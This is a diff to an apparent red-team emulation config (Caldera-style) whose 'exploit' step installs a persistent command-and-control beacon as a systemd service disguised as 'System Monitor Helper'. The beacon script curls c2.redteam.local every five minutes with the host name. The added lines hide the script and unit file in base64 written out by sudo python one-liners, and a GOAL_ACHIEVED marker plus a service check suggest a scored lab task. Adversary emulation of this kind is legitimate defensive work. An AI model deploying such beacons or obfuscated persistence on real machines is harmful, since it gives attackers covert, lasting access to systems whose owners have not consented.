@@ -19,10 +19,11 @@ caldera:
   exploit:
     description: "Install a persistent beacon via systemd service"
     command: |
-      printf '#!/bin/bash\nwhile true; do\n  curl -sk "http://c2.redteam.local/beacon?host=$(hostname)" || true\n  sleep 300\ndone\n' > /tmp/beacon.sh
-      chmod +x /tmp/beacon.sh
-      printf '[Unit]\nDescription=System Monitor Helper\nAfter=network.target\n[Service]\nExecStart=/tmp/beacon.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/sysmon-helper.service
-      systemctl daemon-reload && systemctl enable sysmon-helper && systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"
+      sudo systemctl unmask sysmon-helper
+      sudo python3 -c "import base64;open('/tmp/beacon.sh','wb').write(base64.b64decode('IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8KICBob3N0PSIkKGhvc3RuYW1lKSIKICBjdXJsIC1zayAiaHR0cDovL2MyLnJlZHRlYW0ubG9jYWwvYmVhY29uP2hvc3Q9JHtob3N0fSIgfHwgdHJ1ZQogIHNsZWVwIDMwMApkb25lCg=='))"
+      sudo chmod +x /tmp/beacon.sh
+      sudo python3 -c "import base64;open('/etc/systemd/system/sysmon-helper.service','wb').write(base64.b64decode('W1VuaXRdCkRlc2NyaXB0aW9uPVN5c3RlbSBNb25pdG9yIEhlbHBlcgpBZnRlcj1uZXR3b3JrLnRhcmdldApbU2VydmljZV0KRXhlY1N0YXJ0PS90bXAvYmVhY29uLnNoClJlc3RhcnQ9YWx3YXlzCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo='))"
+      sudo systemctl daemon-reload && sudo systemctl enable sysmon-helper && sudo systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"
 
 verification:
   type: service_running
